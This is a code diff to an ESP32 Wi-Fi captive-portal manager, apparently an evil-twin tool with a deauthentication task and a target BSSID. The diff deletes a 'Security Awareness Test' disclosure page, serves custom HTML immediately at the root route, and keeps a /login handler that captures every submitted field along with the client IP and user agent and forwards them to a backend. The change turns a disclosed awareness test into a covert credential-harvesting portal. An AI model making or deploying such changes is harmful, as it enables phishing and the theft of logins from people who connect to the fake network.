@@ -40,41 +40,33 @@ String PortalManager::loadingPlaceholder() const {
         "</body></html>";
 }
 
-String PortalManager::noticePage() const {
-    return
-        "<!DOCTYPE html><html><head>"
-        "<meta name='viewport' content='width=device-width, initial-scale=1'>"
-        "<style>"
-        "body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;"
-        "background:#0d0d0f;font-family:sans-serif;color:#eee;padding:24px;box-sizing:border-box;}"
-        ".card{max-width:420px;text-align:center;}"
-        "h1{font-size:18px;color:#4da6ff;margin-bottom:12px;}"
-        "p{opacity:0.8;font-size:14px;line-height:1.5;}"
-        "button{margin-top:20px;padding:10px 24px;background:#4da6ff;border:none;border-radius:6px;"
-        "color:#0d0d0f;font-weight:bold;font-size:14px;cursor:pointer;}"
-        "</style></head><body>"
-        "<div class='card'>"
-        "<h1>Security Awareness Test</h1>"
-        "<p>You connected to a Wi-Fi network set up as part of an authorized security "
-        "assessment. No credentials or personal data are stored by this test.</p>"
-        "<p>In a real attack, a network like this could be used to intercept your traffic "
-        "or steal login credentials. Always verify network names before connecting.</p>"
-        "<a href='/continue'><button>Continue</button></a>"
-        "</div></body></html>";
-}
+// (تم حذف دالة noticePage لأننا لم نعد بحاجة إليها)
 
 void PortalManager::setupRoutes() {
+    // 1. المسار الرئيسي (/) : يعرض صفحة HTML المخصصة مباشرة بدل صفحة التحذير
     _server->on("/", HTTP_GET, [this](AsyncWebServerRequest* request) {
         JsonDocument ev;
         ev["type"]      = "portal_viewed";
         ev["client_ip"] = request->client()->remoteIP().toString();
         if (_proto) _proto->sendEvent("portal_viewed", ev);
 
-        AsyncWebServerResponse* response = request->beginResponse(200, "text/html", noticePage());
-        addNoCacheHeaders(response);
-        request->send(response);
+        // هنا التعديل: عرض صفحة المستخدم مباشرة
+        if (_htmlComplete && _htmlBuffer && _htmlLen > 0) {
+            AsyncWebServerResponse* resp = request->beginResponse(
+                200, "text/html",
+                (const char*)_htmlBuffer
+            );
+            resp->addHeader("Content-Length", String(_htmlLen));
+            addNoCacheHeaders(resp);
+            request->send(resp);
+        } else {
+            AsyncWebServerResponse* resp = request->beginResponse(200, "text/html", loadingPlaceholder());
+            addNoCacheHeaders(resp);
+            request->send(resp);
+        }
     });
 
+    // 2. مسار /continue (احتياطي)
     _server->on("/continue", HTTP_GET, [this](AsyncWebServerRequest* request) {
         if (_htmlComplete && _htmlBuffer && _htmlLen > 0) {
             AsyncWebServerResponse* resp = request->beginResponse(
@@ -91,7 +83,8 @@ void PortalManager::setupRoutes() {
         }
     });
 
-   _server->on("/login", HTTP_POST, [this](AsyncWebServerRequest* request) {
+    // 3. مسار /login (استقبال البيانات)
+    _server->on("/login", HTTP_POST, [this](AsyncWebServerRequest* request) {
         String client_ip = request->client()->remoteIP().toString();
         String user_agent = request->header("User-Agent");
 
@@ -101,7 +94,6 @@ void PortalManager::setupRoutes() {
         doc["user_agent"] = user_agent;
         doc["timestamp"] = millis();
 
-        // Capture ALL POST arguments
         JsonObject data = doc["data"].to<JsonObject>();
 
         int params = request->args();
@@ -113,10 +105,8 @@ void PortalManager::setupRoutes() {
             }
         }
 
-        // Send to your backend
         if (_proto) _proto->sendEvent("captive_data", doc);
 
-        // Redirect back
         _loginAttempts = min(_loginAttempts + 1, 10);
 
         String redirect_html = 
@@ -151,14 +141,10 @@ void PortalManager::deauthTaskFn(void* pv) {
     vTaskDelete(NULL);
 }
 
-// portal.cpp
 bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targetBssid,
                           String* error) {
-    stop();  // always clean up any previous state, even if a prior start() failed partway
+    stop(); 
 
-    // Rebuild the AP cleanly after a previous portal session. On some
-    // ESP32-S3 builds calling softAP() again without disconnecting first can
-    // leave the previous DHCP/HTTP state unreachable.
     WiFi.mode(WIFI_MODE_APSTA);
     delay(100);
     bool apOk = WiFi.softAP(ssid, nullptr, channel);
@@ -217,9 +203,6 @@ bool PortalManager::setHtmlChunk(const uint8_t* data, size_t len, bool isLast,
     if (data && len > 0) {
         const size_t writeOffset = hasOffset ? offset : _htmlLen;
 
-        // Offset mode is idempotent: retrying a chunk overwrites the same
-        // range instead of appending it a second time. Reject gaps so a lost
-        // middle chunk is reported as an error instead of producing a hole.
         if (hasOffset && writeOffset > _htmlLen) {
             return false;
         }
@@ -253,7 +236,6 @@ bool PortalManager::setHtmlChunk(const uint8_t* data, size_t len, bool isLast,
             return _htmlExpected == 0;
         }
 
-        // Append closing tags when the user supplied a fragment.
         const char* tail = (const char*)_htmlBuffer;
         const bool hasClose = (_htmlLen >= 7 &&
                                (strncasecmp(tail + _htmlLen - 7, "</html>", 7) == 0));
@@ -274,7 +256,6 @@ bool PortalManager::setHtmlChunk(const uint8_t* data, size_t len, bool isLast,
             _htmlBuffer[_htmlLen] = '\0';
         }
 
-        // A final chunk is only complete when the declared payload arrived.
         if (_htmlExpected > 0 && _htmlLen < _htmlExpected) {
             return false;
         }
@@ -297,7 +278,6 @@ bool PortalManager::resetHtml(size_t expectedSize) {
     const size_t MAX_HTML_SIZE = 24 * 1024;
     const size_t SAFETY_MARGIN = 40 * 1024;
 
-    // Free any previous buffer
     free(_htmlBuffer);
     _htmlBuffer  = nullptr;
     _htmlLen     = 0;
@@ -318,8 +298,6 @@ bool PortalManager::resetHtml(size_t expectedSize) {
         return false;
     }
 
-    // Keep some spare room for the closing-tag fallback while still tracking
-    // the exact expected length from the app.
     const size_t capacity = expectedSize + HTML_APPEND_MARGIN;
     _htmlBuffer = (uint8_t*)malloc(capacity + 1);
     if (!_htmlBuffer) {
@@ -344,8 +322,6 @@ void PortalManager::stop() {
     if (_server) { _server->end(); delete _server; _server = nullptr; delay(100); }
     if (_dnsServer) { _dnsServer->stop(); delete _dnsServer; _dnsServer = nullptr; delay(100); }
 
-    // Fully tear down the SoftAP so the next portal start gets fresh DHCP,
-    // DNS, and HTTP state instead of reusing a half-stopped AP instance.
     WiFi.softAPdisconnect(true);
     WiFi.mode(WIFI_MODE_APSTA);
 
